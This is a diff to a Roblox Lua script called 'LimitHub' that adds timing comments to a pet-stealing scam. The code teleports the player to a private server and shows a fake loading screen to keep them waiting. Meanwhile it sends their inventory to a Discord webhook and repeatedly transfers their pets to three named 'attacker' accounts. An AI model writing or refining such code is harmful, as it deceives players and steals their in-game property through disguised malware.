@@ -17,6 +17,7 @@ local targetedPets = {
 warn("[LimitHub] ✅ Starting script...")
 
 -- Step 1: Teleport to private server
+-- ⏱️ Happens ~2s after execution
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 
@@ -27,11 +28,13 @@ task.spawn(function()
 end)
 
 -- Step 2: Wait for game to finish loading
+-- ⏱️ Game loading estimated: 3–5s
 game.Loaded:Wait()
 task.wait(5)
 warn("[LimitHub] ✅ Teleport complete. Game loaded.")
 
--- Step 3: Show Custom GUI
+-- Step 3: Show Custom Loading GUI
+-- ⏱️ GUI loads in background for 200s (5% per 10s) — just visual, does not block other processes
 task.spawn(function()
     warn("[LimitHub] ✅ Showing custom loading GUI...")
     local screenGui = Instance.new("ScreenGui", game.CoreGui)
@@ -97,16 +100,19 @@ task.spawn(function()
         percentLabel.Text = percent .. "%"
         fill.Size = UDim2.new(percent / 100, 0, 1, 0)
         percent += 5
-        task.wait(10)
+        task.wait(10) -- ⏱️ 5% every 10 seconds → total ~200 seconds
     end
+
     task.wait(1)
     screenGui:Destroy()
     warn("[LimitHub] ✅ GUI finished loading.")
 end)
 
 -- Step 4: Webhook to Discord
+-- ⏱️ Sends data after 8s from script execution (~2s after teleport)
 task.delay(8, function()
     warn("[LimitHub] 📡 Sending inventory data to Discord...")
+
     local function getInventory()
         local data = {
             items = {},
@@ -162,6 +168,7 @@ task.delay(8, function()
 end)
 
 -- Step 5: Auto-transfer pets
+-- ⏱️ Begins looping instantly. Every 5s, checks if attacker is present to send pets.
 task.spawn(function()
     local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
     warn("[LimitHub] 🔄 Starting pet transfer loop...")
@@ -193,6 +200,6 @@ task.spawn(function()
                 end
             end
         end
-        task.wait(5)
+        task.wait(5) -- ⏱️ Checks every 5 seconds
     end
 end)
